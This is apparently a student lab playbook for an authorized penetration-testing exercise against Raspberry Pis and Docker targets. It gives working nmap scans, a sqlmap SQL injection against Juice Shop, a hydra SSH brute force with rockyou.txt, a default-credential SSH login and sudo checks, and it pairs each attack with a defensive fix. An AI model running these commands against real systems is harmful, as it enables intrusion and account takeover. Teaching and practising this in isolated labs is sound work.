# Attack playbook — hack in, select, take control

The three things you need to be able to do, in order. Everything here you can
**practice today** against a Docker target on your own laptop (see
`practice-on-windows.md`) — you don't need the Pis yet. On the real lab you just
swap `localhost` / the practice IP for a Pi's IP (192.168.50.11–13).

> Lab rule: only ever run these against machines you own, on your isolated
> network, under your teacher's written authorization.

---

## Stage A — SELECT (find and pick your target)

You can't attack what you can't see. First map the network, then choose.

**1. Who is alive?**
```bash
nmap -sn 192.168.50.0/24        # ping sweep: lists live hosts
```
**2. What is each host running?**
```bash
nmap -sV -sC 192.168.50.11      # service versions + default scripts
```
Read the output: open **ports** = doors. Each service (ssh, http, ftp, smb) is a
different kind of door with a different way in.

**3. Pick the target.** Choose based on what you found:
- Port 3000 / 80 (a web app) → go to **Stage B, web**.
- Port 22 (ssh) with a default account → **Stage B, service**.
- Port 21 (ftp), 445 (smb) → weak file services, often anonymous.

Feed the scan to your AI tool to help decide what to hit first:
```bash
nmap -sV -oN scan.txt 192.168.50.11 192.168.50.12 192.168.50.13
python3 ai_report.py scan.txt
```

---

## Stage B — HACK IN (get your first foothold)

Match the technique to the door you found.

### Web target (Juice Shop / DVWA on :3000 / :80)
- **Explore with Burp Suite** — proxy the traffic, see every request.
- **SQL injection** (data leak / login bypass):
  ```bash
  sqlmap -u "http://192.168.50.11:3000/rest/products/search?q=test" --batch
  ```
- **Cross-site scripting (XSS)** and **broken auth** — try by hand in DVWA on
  "low", then raise the difficulty.

### Service target (weak SSH / FTP on :22 / :21)
- **Password attack** against SSH (this is how you'd get the `pi/raspberry`
  default):
  ```bash
  hydra -l pi -P /usr/share/wordlists/rockyou.txt ssh://192.168.50.12
  ```
- **Anonymous FTP** — just log in with user `anonymous`, no password, and see
  what files are exposed.

### The point
Each of these ends the same way: you now have **valid credentials** or a
**foothold** on the box. That's the door open.

---

## Stage C — TAKE CONTROL (turn a foothold into control)

### 1. Get a shell
Once you have a login (say from hydra), open a real session:
```bash
ssh pi@192.168.50.12          # password: raspberry
```
You're now a user *on the Pi*. Everything you type runs on it.

### 2. See what you can do
```bash
whoami                         # which account am I?
id                             # my groups / privileges
sudo -l                        # what can I run as root?
```
If `sudo -l` shows `NOPASSWD: ALL`, you effectively own the machine.

### 3. Control it
From that shell you can run anything the account allows — the same actions the
demo's control panel simulates:
```bash
sudo reboot                    # restart it
cat /etc/os-release            # read its info
wall "lab test message"        # broadcast a message to the screen
```

### 4. (Advanced, optional) Keep access
In a real engagement you'd note *how* persistence works so you can defend it:
adding an SSH key, or a cron job. In the lab, **document it and then remove it**
— showing you understand it is the goal, not leaving a backdoor.

---

## The defender's half (this is what earns the marks)

For every door you walked through, write down how to shut it:

| You got in via | How you'd stop it |
| --- | --- |
| Default SSH password | Delete the `pi` default, use SSH keys, disable password login |
| SQL injection | Use parameterised queries, validate input |
| Anonymous FTP | Disable FTP / anonymous access, use SFTP |
| `NOPASSWD: ALL` sudo | Remove blanket sudo, require a password |

A finding without a fix is half a finding.

---

## What to do this week (no Pis needed)

1. Run Juice Shop locally (`practice-on-windows.md`).
2. Do **Stage A** against `localhost` — read the nmap output until it makes sense.
3. Do **Stage B, web** — get one SQL injection working in Juice Shop.
4. Spin up a second cheap target (an old laptop / a VM) and practise **Stage C**:
   ssh in, run `whoami` / `sudo -l`.
5. Write up each one using the defender's table above.

By the time the Pis arrive you'll have done the whole loop already — the Pis just
become three more targets you point the same commands at.
